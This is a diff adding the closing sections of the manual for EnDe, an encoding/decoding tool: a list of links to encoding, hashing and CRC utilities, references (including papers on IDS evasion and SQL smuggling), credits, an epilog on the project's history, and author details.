+	    * http://www.digilantesecurity.com/CAL9000/index.html CAL9000 (home, dead since 2011)
+	* https://www.bindshell.net/tools/coder/ Coder
+	* https://addons.mozilla.org/firefox/addon/1313 (Firefox Extension) ASCIItoUnicode
+	* https://addons.mozilla.org/firefox/addon/1772 (Firefox Extension) ASCIItoUtf-8
+	* https://addons.mozilla.org/firefox/addon/3929 (Firefox Extension) Character Identifier
+	* https://addons.mozilla.org/firefox/addon/3208 (Firefox Extension) Fire Encrypter
+	* https://addons.mozilla.org/firefox/addon/770  (Firefox Extension) Leet Key
+	* https://addons.mozilla.org/firefox/addon/2058 (Firefox Extension) TimestampDecode
+	* https://addons.mozilla.org/firefox/addon/2063 (Firefox Extension) Timestamp Converter
+	* https://addons.mozilla.org/firefox/addon/5235 (Firefox Extension) Unicode Converter
+	* https://addons.mozilla.org/firefox/addon/23389 (Firefox Extension) Unicode Input Tool Cconverter
+	* https://addons.mozilla.org/en-US/firefox/addon/3899 (Firefox Extension) HackBar
+	* http://anmar.eu.org/projects/jssha2/ OpenSource JavaScript implementation of the Secure Hash Algorithms
+	* http://pajhome.org.uk/crypt/ Paj's Home (Cryptography implemented in JavaScript)
+	* http://www.farfarfar.com/scripts/encrypt/     JavaScript Encryption Library
+	* http://www.regular-expressions.info/unicode.html Unicode Regular Expressions
+<!-- http://sourceforge.net/projects/jssha
+     caligatio@users.sourceforge.net
+     jsSHA is a JavaScript implementation of all variants of the SHA family of hashes (SHA-1, SHA-224, SHA-256, SHA-384, SHA-512
+     http://www.matasano.com/log/958/ About Rainbow tables, secure password schemes; MD5, SRP, bcrypt, PHK's MD5 -->
+	* http://parosproxy.org/ Paros Build-in Tool Encode/Hash
+	* http://h4k.in/encoding/ PHP Charset Encoder
+	* http://h4k.in/characters/ PHP Unicode Generator
+	* http://www.ieinspector.com/ HTTP Analyzer
+	* http://www.owasp.org/software/webscarab.html WebScarab built-in Transcoder
+	* http://www.nosec.org/web/files/Encoder.exe NOSEC Encoder
+	* http://www.dns.pl/cgi-bin/en_idntranslator.pl IDN Translator
+	* http://code.gosu.pl/dl/JsDecoder/demo/JsDecoder.html Obfuscated JavaScript Decoder
+	* http://www.owasp.org/index.php/Category:OWASP_Webslayer_Project WebSlayer built-in Encoder
+	* http://www.hashemall.com/ Hash'em all! online hashing
+	* http://hashkiller.com/password/ hashing
+	* http://www.zorc.breitbandkatze.de/crc.html CRC calulation online
+	* http://www.lammertbies.nl/comm/info/crc-calculation.html CRC calulation online
+	* http://www.itl.nist.gov/fipspubs FIPS Home Page
+	* http://www.prox42.de/produkt/convert/demo.php various codings/hashings online
+	* http://www.webutils.pl/Ascii85 Online Ascii85 Encoder / Decoder Tool
+	* http://www.yellowpipe.com/yis/tools/encrypter/index.php Encrypter /Decoder online
+<!-- ASCII to Binary, Binary to ASCII, ASCII to Hex, Hex to ASCII, Binary to Hex, Hex to Binary, Backwards,
+     Base 64 Encode, Base 64 Decode, Caesar Bruteforce, DES Crypt (one way), HTML Entities Encode, HTML Entities Decode,
+     l33t 5p34k 3nc0d3, l33t 5p34k d3c0d3, MD5 Crypt (one way), Igpay Atinlay, Un-Pig Latin, ROT-13, URL Encode, URL Decod, �SHA-1 -->
+	
+	Personal preferences for additional useful tools:
+	* https://addons.mozilla.org/firefox/addon/5235 (Firefox Extension) Unicode Converter
+	* https://addons.mozilla.org/firefox/addon/3208 (Firefox Extension) Fire Encrypter
+	* http://h4k.in/encoding/ PHP Charset Encoder
+	* http://www.thespanner.co.uk/2007/11/06/hackvertor-explained/ Hackvertor
+	* http://code.gosu.pl/dl/JsDecoder/demo/JsDecoder.html Obfuscated JavaScript Decoder
+	* http://www.fileformat.info/info/unicode/block/index.htm Unicode Blocks
+<!--      http://www.fileformat.info/info/unicode/char/00fc/index.htm -->
+	* http://www.goascii.de/ ASCII
+	* http://textop.us/ Hashing, En-, Decryption and other tools online
+	* http://www.easics.com/webtools/crctool CRC Tool online
+	* http://serversniff.net/crypt-checksum.php CRC Tool online
+	* http://www.nwn.de/hgm/krypto/ Verschlüsselte Botschaften (German)
+	* http://atterer.net/uni/crypto.html Beschreibung DES und IDEA (German)
+	* http://macchiato.com/unicode/chart/ Macchiato's Unicode 4.1.0 Chart
+	* http://macchiato.com/unicode/convert.html Macchiato's  UTF Converter
+	
+	(Links valid 2007/2008/2009/2010)
+	
+	
+REFERENCES
+	
+	[1] (translates to any, and all of following)
+		*  Do what you want
+		*  Do what you will
+		*  Do what you wilt
+		*  Do what you wish
+	
+	[2] http://de.wikipedia.org/wiki/Die_unendliche_Geschichte <!-- ugly hack: must have a traling space -->
+		wiki: Die unendliche Geschichte
+	    http://en.wikipedia.org/wiki/The_Neverending_Story <!-- ugly hack: must have a traling space -->
+		wiki: The Neverending Story
+	    (use the de.wiki.. as it's much more informative, currently)
+	
+	[3] http://de.wikipedia.org/wiki/Michael_Ende   wiki: Michael Ende
+	    http://en.wikipedia.org/wiki/Michael_Ende   wiki: Michael Ende
+	
+	[4] http://blogs.zdnet.com/security/?p=1071 Morse Code Rickroll o-day
+	
+	[5] http://dean.edwards.name/ Dean Edward's Packer
+	
+	[6] http://docs.idsresearch.org/http_ids_evasions.pdf       HTTP IDS Evasion
+	
+	[7] http://www.comsecglobal.com/framework/Upload/SQL_Smuggling.pdf SQL Smuggling
+	
+	[8] http://www.cs.waikato.ac.nz/~312/crc.txt A Painless Guide to CRC Error Detection Algorithms
+	
+	
+CREDITS
+	
+	Christian Bockermann, http://jwall.org/core-rules/index.jsp 
+		for adapting CoreRules2Html.jar output
+	
+	Gareth Heyes, http://www.businessinfo.co.uk/labs/jsreg/jsreg.html 
+		for enlighten some formatting functionallity
+	
+	Matt Tesauro, http://www.owasp.org/index.php/Category:OWASP_Live_CD_Project 
+		for the unique EnDe icon and integration into OWASP Live CD
+	
+	
+LEGAL
+	
+	For legal stuff see license.txt at https://github.com/EnDe/EnDe here.
+<!-- need to change license from GPL2 to CC 2.5 or CC 3.0 ? -->
+	
+	
+EPILOG
+	
+	This project was started after  struggling with a  number of tools and
+	realizing that most (all?) of them (see  LINKS  above) did not do what
+	You/I want. The  INTRODUCTION  show more detailled examples.
+	It seems to be a neverending story to find something  where you simply
+	can TU WAS DU WILLST ... [1]  which is the  motto of  "The Neverending
+	Story" [2]  by Michael Ende [3]  and is a nice allegory to the goal to
+	achieve here.
+	
+	That was in early 2007.
+	While implementing the various features as you see them now, there was
+	some spare time to do something just for fun. That's why you find some
+	codings, you won't expect in practical applications --call them easter
+	eggs, if you like.
+	
+	In May 2008 we read about XSS with/in Morse code [4].  That's funny at
+	first view only. But if you're aware about the threats  with something
+	simple like XSS, you'd take this seriously too.
+	There was no need to add Morse code to EnDe's list of coding functions
+	as it already was there. But I removed the  JOKES  section (see easter
+	eggs above) herein, as it comes out again that en-/decoding  becomes a
+	neverending story, see  EPILOG  ...
+	
+<!--	Let's see when problems occour with some other functions already
+	implemented herein ... -->
+	
+	
+VERSION
+	
+	@# EnDe <!-- @(#) EnDe.man.txt 3.32 17:40:57 12/06/09 -->
+	
+	
+AUTHOR
+	
+	07-apr-07 Achim Hoffmann, mailto: EnDe (at) my (dash) stp (dot) net
+	
+			HOME https://github.com/EnDe/EnDe EnDe
+	
